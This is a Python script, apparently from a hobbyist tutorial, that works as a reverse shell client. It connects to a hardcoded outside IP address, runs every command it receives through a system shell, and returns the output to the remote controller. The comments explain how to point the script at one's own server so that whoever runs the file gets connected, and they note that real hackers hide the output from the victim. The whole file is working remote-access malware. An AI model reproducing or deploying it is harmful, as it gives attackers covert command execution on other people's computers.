import socket
import os           #These two are very important
import subprocess   #as because of them we would be able to execute the
                    #instructions that client.py is going to recieve


s = socket.socket()

host = "174.13.76.29" #paste your IP address here so if the client opens the python file, he/she gets connected to your computer. But since your computer has a dynamic IP,
# it will keep changing, whenever you restart your computer. So, to avoid this you can buy a server and paste it's static IP here and
#run serverformultipleclients.py file on the server.
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8")=='cd': #if command starts with cd then it will change the directory accordingly
        os.chdir(data[3:].decode("utf-8"))


    if len(data) >0: #for every command be it cd or echo or other.
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell = True,stdout=subprocess.PIPE,stdin = subprocess.PIPE,stderr=subprocess.PIPE)
        #cmd = subprocess.Popen(data[:].decode("utf-8"),shell = True,stdout=subprocess.PIPE,stdin = subprocess.PIPE,stderr=subprocess.PIPE)
        #.Popen will open the terminal
        #shell = True gives us access to shell commands like dir etc.
        #stdout = output after we type in the command
        #stdin = input we give in the shell
        #stderr = standard error if something gibberish is entered in the terminal

        output_byte = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output_byte,"utf-8") # for displaying in the friend's computer that what we are doing in the terminal. Hackers don't do this. this is printed in the print statement below.
        currentWd = os.getcwd()+"> " # for getting current directory for better visibility of which directory we are residing in currently
        s.send(str.encode(output_str+currentWd)) # send the output back to the server

        print(output_str) #displayed to friend here.
